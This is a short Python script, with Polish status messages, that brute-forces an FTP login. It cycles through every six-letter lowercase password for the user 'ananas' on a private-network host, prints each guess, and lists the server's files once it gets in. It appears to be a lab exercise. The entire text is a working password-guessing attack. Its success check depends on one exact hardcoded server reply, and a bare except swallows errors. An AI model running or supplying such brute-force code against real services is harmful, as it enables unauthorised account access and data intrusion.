#!/usr/bin/env python

from ftplib import FTP

def brute_force(ftp):
	alphabet = "abcdefghijklmnopqrstuvwxyz"

	result = "NOT CONNECTED"
	password_accepted = "230 - Password accepted"

	index1 = 0
	index2 = 0
	index3 = 0
	index4 = 0
	index5 = 0
	index6 = 0
	
	length = len(alphabet)

	while result != password_accepted:
		if index1 >= length:
			index2 += 1
			index1 = 0

		if index2 >= length:
			index3 += 1
			index2 = 0

		if index3 >= length:
			index4 += 1
			index3 = 0

		if index4 >= length:
			index5 += 1
			index4 = 0

		if index5 >= length:
			index6 += 1
			index5 = 0

		if index6 >= length:
			break

		password = alphabet[index6] + alphabet[index5] +\
			alphabet[index4] + alphabet[index3] +\
			alphabet[index2] + alphabet[index1]

		try:
			print(password)
			result = ftp.login('ananas', password)
		except:
			pass
		
		index1 += 1
	if result == password_accepted:
		print("Udalo sie wlamac")
		ftp.retrlines('LIST')
	else:
		print("Niepowodzenie")

ftp = FTP()
ftp.connect('192.168.1.2', 2048)
brute_force(ftp)
ftp.close()
